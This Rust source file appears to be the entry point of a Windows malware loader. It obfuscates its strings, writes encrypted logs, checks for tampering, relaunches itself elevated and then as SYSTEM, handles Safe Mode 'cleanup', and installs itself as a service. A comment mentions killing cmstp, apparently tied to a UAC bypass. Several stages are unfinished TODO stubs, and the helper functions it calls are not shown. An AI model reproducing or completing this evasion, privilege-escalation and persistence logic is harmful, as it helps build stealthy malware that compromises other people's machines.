use lazy_static::lazy_static;
use loader_vars::constants::{ system_log_directory, initial_log_directory };
use safemode::utils::{ safemode_fail_safe, is_safe_mode };
use shared::{
    constants::logs_encryption_key,
    logs::logger::Logger,
    uac::{ checks::{ is_elevated, is_system }, impersonate_admin::open_self_as_admin },
    utils::{
        anti_tampering::is_clean,
        functions::{
            exit_1,
            get_current_exe,
            is_running_from_system32,
            try_spawn_program_as_system,
        },
    },
};
use windows_service_detector::is_running_as_windows_service;
use std::sync::RwLock;
use obfstr::obfstr as s;

mod service;
mod safemode;

lazy_static! {
    pub static ref LOGGER: RwLock<Option<Logger>> = RwLock::new(None);
}

#[macro_export]
macro_rules! log_internal {
    ($level:expr, $s:expr) => {
        {
        match &*$crate::LOGGER.read().unwrap() {
            Some(logger) => {
                logger.log($level, s!($s));
                println!("{:#?}",$s);
            }
            None => {}
        }
        }
    };

    (
        $level:expr,
        $fmt:expr,
        $($arg:tt)*
    ) => {
        {
            match &*$crate::LOGGER.read().unwrap() {
                Some(logger) => {
                logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
                println!("{}{:#?}", $fmt, $($arg)*);
            }
            None => {}
        }
        }
    };
}
#[macro_export]
macro_rules! info {
    ($s:expr) => {
        crate::log_internal!(s!("INFO"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("INFO"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! warn {
    ($s:expr) => {
        $crate::log_internal!(s!("WARN"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("WARN"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! err {
    ($s:expr) => {
        $crate::log_internal!(s!("ERROR"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
           $crate::log_internal!(s!("ERROR"), $fmt, $($arg)*
        )
    };
}
#[macro_export]
macro_rules! verbose {
    ($s:expr) => {
        $crate::log_internal!(s!("VERBOSE"), $s)
    };
    (
        $fmt:expr,
        $($arg:tt)*
    ) => {
        $crate::log_internal!(s!("VERBOSE"), $fmt, $($arg)*)
    };
}
#[macro_export]
macro_rules! tag {
    ($s:expr) => {
        $crate::log_internal!(s!("TAG"), $s)
    };
}

fn main() {
    let is_running_from_system_dir = is_running_from_system32();
    let log_directory = if is_running_from_system_dir {
        system_log_directory()
    } else {
        initial_log_directory()
    };
    if let Ok(logger) = Logger::new(log_directory.clone(), logs_encryption_key()) {
        let mut lock = LOGGER.write().unwrap();
        *lock = Some(logger);
    }
    info!("Init");

    if !is_clean() {
        tag!("NOT-CLEAN");
        exit_1();
    }

    if
        !is_elevated().unwrap_or_else(|error| {
            err!("Failed to check if elevanted, assuming its not: ", error);
            false
        })
    {
        tag!("ELEVATE");

        if let Err(error) = open_self_as_admin() {
            err!("Failed to open_self_as_admin: ", error);
        }
        exit_1();
    }
    let is_system = is_system().unwrap_or_else(|error| {
        err!("Failed to check if is_system, assuming its not: ", error);
        false
    });
    if is_safe_mode() {
        if is_system {
            tag!("CLEANUP");
            //! TODO
        } else {
            tag!("LAUNCH-CLEANUP");
            if
                let Err(error) = try_spawn_program_as_system(
                    get_current_exe().to_str().unwrap(),
                    None
                )
            {
                err!("Failed to spawn_program_as_system: ", error);
                safemode_fail_safe();
            }
            exit_1();
        }
    }

    let is_service = is_running_as_windows_service().unwrap_or_else(|error| {
        err!("Error checking if running as service, assuming it is:", error);
        true
    });
    if is_service {
        //! TODO
        //! run service runner
    } else {
        if is_running_from_system_dir {
            if is_system {
                tag!("SYS-SERVICE-INSTALL");
                //! TODO
            } else {
                tag!("LAUNCH-SYS-SERVICE-INSTALL");
                if
                    let Err(error) = try_spawn_program_as_system(
                        get_current_exe().to_str().unwrap(),
                        None
                    )
                {
                    err!("Failed to spawn_program_as_system: ", error);
                }
                exit_1();
            }
        } else {
            tag!("INITIAL-SERVICE-INSTALL");
            // try kill cmstp

            // install itself as service
        }
    }
}
